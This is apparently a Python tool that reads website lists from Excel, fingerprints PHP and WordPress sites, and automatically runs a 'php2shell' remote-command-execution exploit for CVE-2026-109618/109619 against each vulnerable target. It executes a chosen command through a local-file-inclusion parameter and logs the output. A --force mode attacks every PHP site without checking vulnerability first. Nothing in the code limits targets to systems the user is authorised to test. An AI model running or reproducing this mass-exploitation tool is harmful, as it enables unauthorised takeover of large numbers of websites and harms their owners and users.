#!/usr/bin/env python3
"""
automate-php2shell.py - Bulk PHP/WordPress Vulnerability Scanner

Reads websites from Excel sheet, identifies PHP/WordPress sites,
and runs php2shell exploit against vulnerable targets.

Usage:
    python3 automate-php2shell.py --input sites.xlsx --output results.xlsx
    python3 automate-php2shell.py --input sites.xlsx --output results.xlsx --threads 10
"""

import argparse
import sys
import os
import re
import json
import time
import threading
import subprocess
import pandas as pd
from datetime import datetime
from urllib.parse import urlparse
import requests

try:
    from openpyxl import load_workbook
    from openpyxl.styles import Font, PatternFill, Alignment
    from openpyxl.utils import get_column_letter
except ImportError:
    print("ERROR: openpyxl not installed. Run: pip install openpyxl pandas")
    sys.exit(1)

try:
    import openpyxl
except ImportError:
    print("ERROR: openpyxl not installed. Run: pip install openpyxl")
    sys.exit(1)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class BulkPHPScanner:
    def __init__(self, output_dir="results", threads=5, timeout=30, force=False):
        self.output_dir = output_dir
        self.threads = threads
        self.timeout = timeout
        self.force = force
        self.results = []
        self.lock = threading.Lock()
        self.php_sites = []
        self.wordpress_sites = []
        self.vulnerable_sites = []
        self.processed = 0
        self.total = 0
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(f"{output_dir}/phpinfo", exist_ok=True)
        os.makedirs(f"{output_dir}/exploit", exist_ok=True)
        
    def detect_php(self, url, timeout=10):
        """Detect if a website is running PHP."""
        try:
            # Check headers for PHP indicators
            r = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
            headers = r.headers
            
            php_indicators = [
                'x-powered-by: php',
                'php/',
                'phpsessid',
                'set-cookie: php',
                'server: php'
            ]
            
            # Check response headers
            for indicator in php_indicators:
                if indicator.lower() in str(headers).lower():
                    return True, headers
                    
            # Check response body for PHP indicators
            body = r.text.lower()
            php_body_indicators = [
                'php version',
                'phpinfo()',
                'phpsessid=',
                'php error',
                'php warning',
                'php fatal error'
            ]
            
            for indicator in php_body_indicators:
                if indicator in body:
                    return True, headers
                    
            return False, headers
            
        except Exception as e:
            return False, {}
            
    def detect_wordpress(self, url, timeout=10):
        """Detect if a website is WordPress."""
        try:
            r = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
            body = r.text.lower()
            headers = r.headers
            
            wp_indicators = [
                'wp-content',
                'wp-includes',
                'wordpress',
                'generator" content="wordpress',
                'wp-json',
                'wp-login.php',
                'xmlrpc.php'
            ]
            
            for indicator in wp_indicators:
                if indicator in body or indicator in str(headers).lower():
                    return True, body, headers
                    
            return False, body, headers
            
        except Exception as e:
            return False, "", {}
            
    def check_vulnerability(self, url, args):
        """Check if a site is vulnerable to CVE-2026-109618/109619."""
        try:
            # Run recon.py to check preconditions
            cmd = [
                sys.executable, 
                "recon.py",
                url,
                "--json"
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )
            
            if result.returncode == 0:
                recon_data = json.loads(result.stdout)
                return True, recon_data
            else:
                return False, {}
                
        except subprocess.TimeoutExpired:
            return False, {}
        except Exception as e:
            return False, {}
            
    def exploit_site(self, url, recon_data, args):
        """Run php2shell exploit against a vulnerable site."""
        try:
            # Build exploit command
            cmd = [
                sys.executable,
                "php2shell.py",
                url,
                "--path", args.path,
                "--lfi", args.lfi,
                "--param", args.param,
                "--cmd", args.cmd,
                "--json-out", f"{self.output_dir}/exploit/{self._sanitize_filename(url)}.json"
            ]
            
            if args.oom:
                cmd.append("--oom")
                
            if args.force:
                cmd.append("--force")
                
            if args.chunked:
                cmd.append("--chunked")
                
            if args.verbose:
                cmd.append("--verbose")
                
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout + 60  # Extra time for exploit
            )
            
            # Parse result
            result_file = f"{self.output_dir}/exploit/{self._sanitize_filename(url)}.json"
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    exploit_data = json.load(f)
                return True, exploit_data
            else:
                return False, {}
                
        except Exception as e:
            return False, {}
            
    def _sanitize_filename(self, url):
        """Convert URL to safe filename."""
        parsed = urlparse(url)
        hostname = parsed.netloc.replace(':', '_')
        return re.sub(r'[^\w\-_]', '_', hostname)
        
    def process_site(self, site_url, args):
        """Process a single site for PHP detection and exploitation."""
        if not site_url:
            return None
            
        # Ensure URL has protocol
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
            
        print(f"{bcolors.OKBLUE}[*] Processing: {site_url}{bcolors.ENDC}")
        
        result = {
            "url": site_url,
            "timestamp": datetime.now().isoformat(),
            "is_php": False,
            "is_wordpress": False,
            "is_vulnerable": False,
            "php_info": {},
            "exploit_result": None,
            "error": None
        }
        
        try:
            # Step 1: Detect PHP
            is_php, headers = self.detect_php(site_url, self.timeout)
            result["is_php"] = is_php
            result["php_headers"] = dict(headers) if headers else {}
            
            if not is_php:
                print(f"  {bcolors.WARNING}[-] Not a PHP site{bcolors.ENDC}")
                return result
                
            self.php_sites.append(site_url)
            print(f"  {bcolors.OKGREEN}[+] PHP detected{bcolors.ENDC}")
            
            # Step 2: Detect WordPress
            is_wp, body, wp_headers = self.detect_wordpress(site_url, self.timeout)
            result["is_wordpress"] = is_wp
            result["wp_headers"] = dict(wp_headers) if wp_headers else {}
            
            if is_wp:
                self.wordpress_sites.append(site_url)
                print(f"  {bcolors.OKCYAN}[+] WordPress detected{bcolors.ENDC}")
                
            # Step 3: Check vulnerability
            if not self.force:
                is_vuln, recon_data = self.check_vulnerability(site_url, args)
                result["is_vulnerable"] = is_vuln
                result["php_info"] = recon_data
                
                if is_vuln:
                    self.vulnerable_sites.append(site_url)
                    print(f"  {bcolors.OKGREEN}[+] VULNERABLE - Running exploit...{bcolors.ENDC}")
                    
                    # Step 4: Run exploit
                    success, exploit_data = self.exploit_site(site_url, recon_data, args)
                    result["exploit_result"] = exploit_data
                    
                    if success:
                        print(f"  {bcolors.OKGREEN}[+] Exploit completed{bcolors.ENDC}")
                    else:
                        print(f"  {bcolors.WARNING}[-] Exploit failed{bcolors.ENDC}")
                else:
                    print(f"  {bcolors.WARNING}[-] Not vulnerable or preconditions not met{bcolors.ENDC}")
            else:
                print(f"  {bcolors.WARNING}[!] Force mode - running exploit without pre-check{bcolors.ENDC}")
                success, exploit_data = self.exploit_site(site_url, {}, args)
                result["exploit_result"] = exploit_data
                
        except Exception as e:
            result["error"] = str(e)
            print(f"  {bcolors.FAIL}[!] Error: {e}{bcolors.ENDC}")
            
        with self.lock:
            self.processed += 1
            self.results.append(result)
            
        return result
        
    def process_batch(self, urls, args):
        """Process multiple sites using thread pool."""
        self.total = len(urls)
        threads = []
        
        for url in urls:
            while threading.active_count() > self.threads:
                time.sleep(0.1)
                
            t = threading.Thread(
                target=self.process_site,
                args=(url, args)
            )
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
            
    def save_results_excel(self, output_file):
        """Save results to Excel file."""
        # Prepare data for Excel
        data = []
        for result in self.results:
            row = {
                "URL": result["url"],
                "Timestamp": result["timestamp"],
                "Is PHP": "Yes" if result["is_php"] else "No",
                "Is WordPress": "Yes" if result["is_wordpress"] else "No",
                "Is Vulnerable": "Yes" if result["is_vulnerable"] else "No",
                "PHP Version": result.get("php_info", {}).get("php_info", {}).get("version", "N/A"),
                "Memory Limit": result.get("php_info", {}).get("php_info", {}).get("memory_limit", "N/A"),
                "Session Upload Progress": result.get("php_info", {}).get("php_info", {}).get("session_upload_progress_enabled", "N/A"),
                "Exploit Success": "Yes" if result.get("exploit_result", {}).get("vulnerable", False) else "No",
                "Command Output": result.get("exploit_result", {}).get("output", "")[:200],
                "Error": result.get("error", "")[:200]
            }
            data.append(row)
            
        # Create DataFrame
        df = pd.DataFrame(data)
        
        # Save to Excel
        df.to_excel(output_file, index=False)
        
        # Format Excel
        wb = load_workbook(output_file)
        ws = wb.active
        
        # Color coding
        green_fill = PatternFill(start_color="00FF00", end_color="00FF00", fill_type="solid")
        yellow_fill = PatternFill(start_color="FFFF00", end_color="FFFF00", fill_type="solid")
        red_fill = PatternFill(start_color="FF0000", end_color="FF0000", fill_type="solid")
        
        for row in range(2, ws.max_row + 1):
            # Color PHP column
            if ws.cell(row, 3).value == "Yes":
                ws.cell(row, 3).fill = green_fill
                
            # Color WordPress column
            if ws.cell(row, 4).value == "Yes":
                ws.cell(row, 4).fill = yellow_fill
                
            # Color Vulnerable column
            if ws.cell(row, 5).value == "Yes":
                ws.cell(row, 5).fill = green_fill
                
            # Color Exploit Success column
            if ws.cell(row, 8).value == "Yes":
                ws.cell(row, 8).fill = green_fill
                
        # Auto-adjust column widths
        for col in range(1, ws.max_column + 1):
            max_width = 0
            for row in range(1, ws.max_row + 1):
                cell_value = str(ws.cell(row, col).value)[:50]
                max_width = max(max_width, len(cell_value))
            ws.column_dimensions[get_column_letter(col)].width = min(max_width + 2, 50)
            
        wb.save(output_file)
        
    def save_summary(self, output_file):
        """Save summary statistics."""
        summary = {
            "total_sites": self.total,
            "php_sites": len(self.php_sites),
            "wordpress_sites": len(self.wordpress_sites),
            "vulnerable_sites": len(self.vulnerable_sites),
            "exploit_successes": len([r for r in self.results if r.get("exploit_result", {}).get("vulnerable", False)]),
            "timestamp": datetime.now().isoformat()
        }
        
        with open(output_file, 'w') as f:
            json.dump(summary, f, indent=2)
            
        return summary


def main():
    parser = argparse.ArgumentParser(
        description="Bulk PHP/WordPress Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 automate-php2shell.py --input sites.xlsx --output results.xlsx
  python3 automate-php2shell.py --input sites.xlsx --output results.xlsx --threads 10
  python3 automate-php2shell.py --input sites.xlsx --output results.xlsx --force --oom
        """
    )
    
    parser.add_argument("--input", "-i", required=True, help="Input Excel file with URLs")
    parser.add_argument("--output", "-o", default="results.xlsx", help="Output Excel file (default: results.xlsx)")
    parser.add_argument("--threads", "-t", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    parser.add_argument("--force", action="store_true", help="Skip precondition checks")
    parser.add_argument("--oom", action="store_true", help="Exploit CVE-2026-109618 via OOM")
    parser.add_argument("--path", default="/index.php", help="Path to include() sink (default: /index.php)")
    parser.add_argument("--lfi", default="/index.php", help="LFI payload (default: /index.php)")
    parser.add_argument("--param", default="page", help="LFI parameter name (default: page)")
    parser.add_argument("--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("--chunked", action="store_true", help="Use chunked transfer encoding")
    parser.add_argument("--verbose", action="store_true", help="Show verbose output")
    
    args = parser.parse_args()
    
    # Check if input file exists
    if not os.path.exists(args.input):
        print(f"{bcolors.FAIL}ERROR: Input file not found: {args.input}{bcolors.ENDC}")
        sys.exit(1)
        
    print_banner()
    
    # Load URLs from Excel
    print(f"{bcolors.OKBLUE}[*] Loading URLs from {args.input}{bcolors.ENDC}")
    
    try:
        df = pd.read_excel(args.input)
        
        # Try to find URL column
        url_columns = ['url', 'URL', 'site', 'Site', 'website', 'Website', 'domain', 'Domain']
        url_column = None
        
        for col in url_columns:
            if col in df.columns:
                url_column = col
                break
                
        if url_column is None:
            # Try first column
            url_column = df.columns[0]
            
        urls = df[url_column].dropna().tolist()
        print(f"{bcolors.OKGREEN}[+] Loaded {len(urls)} URLs{bcolors.ENDC}")
        
    except Exception as e:
        print(f"{bcolors.FAIL}ERROR: Failed to load Excel file: {e}{bcolors.ENDC}")
        sys.exit(1)
        
    # Initialize scanner
    scanner = BulkPHPScanner(
        output_dir="results",
        threads=args.threads,
        timeout=args.timeout,
        force=args.force
    )
    
    # Process sites
    print(f"{bcolors.OKBLUE}[*] Starting bulk scan with {args.threads} threads...{bcolors.ENDC}")
    start_time = time.time()
    
    scanner.process_batch(urls, args)
    
    elapsed = time.time() - start_time
    
    # Save results
    print(f"\n{bcolors.OKBLUE}[*] Saving results...{bcolors.ENDC}")
    scanner.save_results_excel(args.output)
    summary = scanner.save_summary(f"{scanner.output_dir}/summary.json")
    
    # Print summary
    print(f"\n{bcolors.OKGREEN}{'='*60}{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}Scan Complete!{bcolors.ENDC}")
    print(f"{bcolors.OKGREEN}{'='*60}{bcolors.ENDC}")
    print(f"  Total sites: {summary['total_sites']}")
    print(f"  PHP sites: {summary['php_sites']}")
    print(f"  WordPress sites: {summary['wordpress_sites']}")
    print(f"  Vulnerable sites: {summary['vulnerable_sites']}")
    print(f"  Exploit successes: {summary['exploit_successes']}")
    print(f"  Time elapsed: {elapsed:.2f} seconds")
    print(f"  Results saved to: {args.output}")
    print(f"  Summary saved to: {scanner.output_dir}/summary.json")
    print(f"{'='*60}")


def print_banner():
    banner = r"""
   ____  _   _ ____ ____  ____  _   _ _____ _     _  
  |  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | | 
  | |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | | 
  |  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
  |_|   |_| |_|_|  |_____|____/|_| |_|_____|_____|_____|
         P H P 2 S H E L L   ·   B U L K   S C A N N E R
    """
    print(bcolors.OKCYAN + banner + bcolors.ENDC)


if __name__ == "__main__":
    sys.exit(main())
